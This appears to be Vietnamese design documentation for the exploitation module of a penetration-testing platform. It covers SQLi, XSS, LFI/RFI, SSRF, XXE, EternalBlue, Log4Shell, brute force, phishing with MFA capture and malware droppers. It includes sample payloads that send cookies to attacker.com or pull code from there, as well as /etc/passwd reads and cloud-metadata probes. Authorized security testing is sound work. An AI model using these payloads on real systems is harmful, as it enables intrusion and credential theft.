
# 💣 Phantoma ATTACK — Tài Liệu Module Khai Thác

> **Phiên bản:** 1.0.0  
> **Module:** Exploitation & Vulnerability Chaining  
> **Nền tảng:** Phantoma — Hệ Sinh Thái An Ninh Mạng Tự Động Hóa  

---

## 📑 Mục Lục

- [1. Tổng Quan Kiến Trúc](#1-tổng-quan-kiến-trúc)
- [2. Khai Thác Web](#2-khai-thác-web)
- [3. Khai Thác Mạng & Dịch Vụ](#3-khai-thác-mạng--dịch-vụ)
- [4. Khai Thác Active Directory](#4-khai-thác-active-directory)
- [5. Khai Thác Client‑Side & Social Engineering](#5-khai-thác-client-side--social-engineering)
- [6. Automation & Exploit Chaining](#6-automation--exploit-chaining)
- [7. Cơ Chế An Toàn & Giới Hạn](#7-cơ-chế-an-toàn--giới-hạn)
- [8. Luồng Dữ Liệu & API](#8-luồng-dữ-liệu--api)
- [9. Hướng Dẫn Phát Triển](#9-hướng-dẫn-phát-triển)

---

## 1. Tổng Quan Kiến Trúc

Module **ATTACK** nhận đầu vào từ **INTEL** (thông tin thụ động) và **SCAN** (dịch vụ, lỗ hổng tiềm năng), sau đó thực thi các exploit tương ứng.

```
ATTACK/
├── ATTACK.md                    ← Tài liệu này
├── index.tsx                    ← Component chính
├── Web/                         ← Khai thác web
│   ├── SQLi.tsx
│   ├── XSS.tsx
│   ├── LFI_RFI.tsx
│   ├── SSRF.tsx
│   ├── XXE.tsx
│   ├── Deserialization.tsx
│   └── ...
├── Network/                     ← Khai thác mạng
│   ├── EternalBlue.tsx
│   ├── BruteForce.tsx
│   ├── RCE_Service.tsx
│   └── ...
├── AD/                          ← Khai thác AD (gọi lại AD module)
│   └── (có thể tái sử dụng AD.md)
├── Client/                      ← Client‑side & Social
│   ├── Phishing.tsx
│   └── ...
├── services/                    (sqlmap, metasploit, custom scripts)
├── types/
└── utils/
```

### 🎯 Các kỹ thuật khai thác chính

| # | Loại | Kỹ thuật | Mô tả |
|---|------|----------|-------|
| 1 | Web | SQL Injection | Dùng sqlmap hoặc thủ công |
| 2 | Web | XSS (Reflected/Stored/DOM) | Tạo payload, thu thập cookie |
| 3 | Web | LFI / RFI | Đọc file, RCE qua PHP wrappers |
| 4 | Web | SSRF | Truy cập nội bộ, cloud metadata |
| 5 | Web | XXE | Đọc file, SSRF, DoS |
| 6 | Web | Insecure Deserialization (Java, PHP, .NET) | RCE |
| 7 | Web | Command Injection | RCE |
| 8 | Network | EternalBlue (MS17‑010) | RCE trên Windows chưa patch |
| 9 | Network | Brute‑force (SSH, RDP, FTP) | Hydra |
| 10 | Network | Service RCE (Log4j, Heartbleed, Shellshock) | CVE‑specific |
| 11 | AD | Kerberoasting, DCSync, Golden Ticket | (gọi từ AD module) |
| 12 | Client | Phishing (clone trang đăng nhập) | Evilginx, SET |
| 13 | Client | Malware dropper | Tải payload từ xa |

---

## 2. Khai Thác Web

### 2.1 SQL Injection (SQLi)

| Tham số | Kiểu | Mô tả |
|---------|------|-------|
| `url` | `string` | URL đích (có tham số) |
| `data` | `string` | POST data (nếu có) |
| `cookie` | `string` | Session cookie (nếu cần) |
| `technique` | `string` | `error` / `blind` / `time` / `union` |
| `dbms` | `string?` | `mysql` / `mssql` / `oracle` / `postgresql` |
| `level` | `number` | 1–5 (càng cao càng nhiều payload) |

**Công cụ:** `sqlmap --batch --level=3 --risk=2 -u <url>`.

**Kết quả trả về:**
- `vulnerable: true/false`
- `databaseNames: string[]`
- `tables: { db, tables[] }`
- `credentials: { user, password }[]`

**Component:** `Web/SQLi.tsx` – nhập URL, chạy, hiển thị kết quả dạng cây.

### 2.2 Cross-Site Scripting (XSS)

- **Reflected XSS**: Tìm tham số phản chiếu không encode.
- **Stored XSS**: Gửi payload vào form, lưu vào database.
- **DOM‑based XSS**: Phân tích JavaScript client.

**Payload mẫu:** `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`.

**Công cụ:** `dalfox`, `XSStrike`, hoặc tự động gửi payload.

**Output:** `{ url, parameter, payload, proof (alert triggered) }`.

### 2.3 Local File Inclusion (LFI) / Remote File Inclusion (RFI)

| Kỹ thuật | Mô tả |
|----------|-------|
| LFI | Đọc file hệ thống: `../../../../etc/passwd` |
| LFI → RCE | Dùng `php://filter`, `php://input`, `expect://` |
| RFI | Include file từ remote: `http://attacker.com/shell.txt` |

**Công cụ:** `lfi-suite`, `fimap`.

### 2.4 Server‑Side Request Forgery (SSRF)

| Mục tiêu | URL thử |
|----------|---------|
| Localhost | `http://127.0.0.1:80/admin` |
| AWS metadata | `http://169.254.169.254/latest/meta-data/` |
| Internal services | `http://internal.corp/` |

**Output:** `{ success, responseBody, accessedInternal, cloudMetadata? }`.

### 2.5 XML External Entity (XXE)

- Gửi XML với `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
- Có thể dẫn đến SSRF, DoS (Billion Laughs).

**Công cụ:** `xxe-lab`, Burp Suite plugin.

### 2.6 Insecure Deserialization

- **Java**: `ysoserial` tạo payload cho các gadget chain.
- **PHP**: `unserialize()` với `__wakeup` hoặc `__destruct`.
- **.NET**: `ObjectDataProvider`, `ActivitySurrogateSelector`.

**Output:** RCE, ghi file, reverse shell.

---

## 3. Khai Thác Mạng & Dịch Vụ

### 3.1 EternalBlue (MS17‑010)

| Tham số | Mô tả |
|---------|-------|
| `target` | IP của Windows (7/2008/R2) |
| `payload` | `windows/x64/meterpreter/reverse_tcp` |
| `lhost` | IP của listener |

**Công cụ:** Metasploit `exploit/windows/smb/ms17_010_eternalblue`.

**Output:** Shell SYSTEM.

### 3.2 Brute‑force (SSH, RDP, FTP, HTTP Form)

| Tham số | Mô tả |
|---------|-------|
| `service` | `ssh` / `rdp` / `ftp` / `http-post-form` |
| `target` | IP:port |
| `username` | user hoặc wordlist |
| `password` | wordlist |

**Công cụ:** `hydra`, `medusa`, `nmap` brute scripts.

### 3.3 Service‑Specific RCE

- **Log4Shell** (CVE‑2021‑44228): Gửi `${jndi:ldap://attacker.com/exploit}`.
- **Heartbleed** (CVE‑2014‑0160): Dump memory (đã cũ).
- **Shellshock** (CVE‑2014‑6271): `() { :; }; /bin/bash -c '...'`.

**Output:** Thực thi lệnh, lấy shell.

---

## 4. Khai Thác Active Directory

Module ATTACK có thể gọi trực tiếp các kỹ thuật đã định nghĩa trong `AD.md`, hoặc cung cấp giao diện tích hợp:

- Kerberoasting → hash → crack → login
- DCSync → dump hash krbtgt → Golden Ticket
- Pass‑the‑Hash → psexec

**Component:** `AD/` có thể tái sử dụng hoặc nhúng iframe.

---

## 5. Khai Thác Client‑Side & Social Engineering

### 5.1 Phishing (Clone Website)

- Dùng `Evilginx` hoặc `Social‑Engineer Toolkit (SET)`.
- Clone trang đăng nhập (Office365, Gmail, VPN).
- Thu thập credential và MFA token (nếu có).

**Output:** `{ url, capturedCredentials, mfaToken? }`.

### 5.2 Malware Dropper

- Tạo payload bằng `msfvenom` hoặc `PAYLOAD` module.
- Nhúng vào tài liệu (macro) hoặc executable.
- Gửi qua email hoặc hosting.

**Lưu ý:** Module ATTACK không tự động gửi email (để tránh vi phạm), chỉ hỗ trợ tạo file.

---

## 6. Automation & Exploit Chaining

ATTACK có thể chạy **multi‑stage attack chain** dựa trên kết quả của INTEL và SCAN.

**Ví dụ chuỗi tự động:**
1. INTEL phát hiện subdomain `admin.xyz.com`
2. SCAN quét cổng thấy port 8080 (Tomcat)
3. SCAN phát hiện lỗ hổng Log4Shell
4. ATTACK tự động chạy exploit Log4Shell → shell
5. (Tùy chọn) POST để leo thang

**Cấu hình chain:** file YAML hoặc JSON mô tả các bước, điều kiện.

---

## 7. Cơ Chế An Toàn & Giới Hạn

### 7.1 Xác nhận ủy quyền bắt buộc

- Người dùng phải nhập mã xác nhận (token) do quản trị cấp.
- Mỗi phiên ATTACK đều được ghi log đầy đủ (IP, thời gian, target, exploit).

### 7.2 Chạy trong sandbox

- Khuyến nghị chạy trong container hoặc VM dùng riêng.
- Cấm tự động gửi exploit ra ngoài Internet nếu không có cấu hình.

### 7.3 Hạn chế tác động

- SQL injection: chỉ `--batch --flush-session`, không `--os-shell` trừ khi được bật.
- EternalBlue: chỉ chạy trong lab.
- Không hỗ trợ khai thác `0‑day` (chỉ CVE có sẵn).

---

## 8. Luồng Dữ Liệu & API

```
INTEL/SCAN → ATTACK → (chọn exploit) → chạy → kết quả → lưu vào workspace
                                  ↓
                              (có thể gọi POST)
```

### Endpoints dự kiến

| Method | Endpoint | Body | Mô tả |
|--------|----------|------|-------|
| POST | `/api/attack/web/sqli` | `{ url, data, cookie, level }` | Chạy sqlmap |
| POST | `/api/attack/web/xss` | `{ url, parameter, payload }` | Kiểm tra XSS |
| POST | `/api/attack/web/lfi` | `{ url, param, filePath }` | Đọc file |
| POST | `/api/attack/web/ssrf` | `{ url, param, targetUrl }` | Thử SSRF |
| POST | `/api/attack/network/eternalblue` | `{ target, lhost, lport }` | RCE |
| POST | `/api/attack/network/bruteforce` | `{ service, target, usernameList, passwordList }` | Hydra |
| POST | `/api/attack/ad/kerberoast` | `{ domainController, user, password }` | Gọi AD module |

Tất cả API đều cần header `X-Attack-Authorization` và trường `authorized: true`.

---

## 9. Hướng Dẫn Phát Triển

### 9.1 Các service cần viết

| File | Mô tả |
|------|-------|
| `services/sqlmap.ts` | Gọi sqlmap, parse output JSON |
| `services/xss.ts` | Gửi payload, so sánh response |
| `services/lfi.ts` | Thử các mẫu path traversal |
| `services/eternalblue.ts` | Gọi Metasploit RPC hoặc script Python |
| `services/bruteforce.ts` | Dùng hydra, parse kết quả |

### 9.2 Tích hợp Metasploit

- Có thể dùng `msfrpc` (Node.js) để gọi module.
- Hoặc gọi `msfconsole` với resource script.

### 9.3 UI Components

- **ExploitSelector**: danh sách các loại exploit dựa trên dữ liệu đầu vào (từ SCAN).
- **ExploitRunner**: form nhập tham số, nút "Execute", hiển thị log real‑time.
- **ChainBuilder**: kéo thả các exploit, lưu pipeline.

### 9.4 Ghi log và bằng chứng

- Mỗi exploit thành công đều lưu screenshot (cho web), output của lệnh (cho shell).
- Xuất file `.log` và `.json` để REPORT sử dụng.

---

## 📊 Tổng Kết

| Chỉ số | Giá trị |
|--------|---------|
| **Số kỹ thuật** | 15+ (SQLi, XSS, LFI, SSRF, XXE, Deserialize, EternalBlue, Brute, Log4j, Kerberoast, DCSync, Phishing, Dropper) |
| **Công cụ tích hợp** | sqlmap, hydra, metasploit, evilginx, ysoserial, dalfox, xsstrike |
| **Phạm vi** | Web, Network, AD, Client |
| **Mức độ an toàn** | Cảnh báo cực mạnh, mọi hành động đều có log và xác nhận |

> **Phantoma ATTACK v1.0.0** — *"Khai thác có trách nhiệm, minh bạch và an toàn"* 💥